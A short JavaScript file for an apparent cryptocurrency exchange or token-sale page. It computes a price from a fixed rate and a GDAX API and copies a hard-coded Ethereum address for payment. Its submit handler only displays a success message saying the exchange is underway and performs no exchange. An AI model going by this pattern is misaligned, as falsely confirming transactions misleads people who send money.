function handleChange() {
  const inputAmount = +document.getElementById("inputAmount").value;
  if (inputAmount < 50) {
    swal("Sorry!", "Minimum amount is 50 ETC!", "error");
    document.getElementById("inputAmount").value = 50;
    return;
  }
  const inputType = document.getElementById("inputType").value;
  if (inputType === "USD") {
    document.getElementById("totlaAmount").value = 4.5 * inputAmount;
    return;
  }
  const apiUrl = `https://api.gdax.com/products/${inputType}-USD/book`
  fetch(apiUrl)
    .then(res => res.json())
    .then(data => {
      const price = +data.bids[0][0];
      document.getElementById("totlaAmount").value = (1 / price) * 4.5 * inputAmount;
    });
}

function handleContinue() {
  document.getElementById("step-1").hidden = true;
  document.getElementById("step-2").hidden = false;
}

function handleSubmit() {
  document.getElementById("step-1").hidden = false;
  document.getElementById("step-2").hidden = true;
  swal("Congrats!", "Your exchange is going on its way!", "success");
}

function handleCopy() {
  var copyText = document.createElement('textarea');
  copyText.value = "0x81888Ae2203ba559DC7145746E0D740431d14D22";
  copyText.setAttribute('readonly', '');
  copyText.style.position = 'absolute';
  copyText.style.left = '-9999px';
  document.body.appendChild(copyText);
  copyText.select();
  document.execCommand('copy');
  document.body.removeChild(copyText);
}

handleChange();
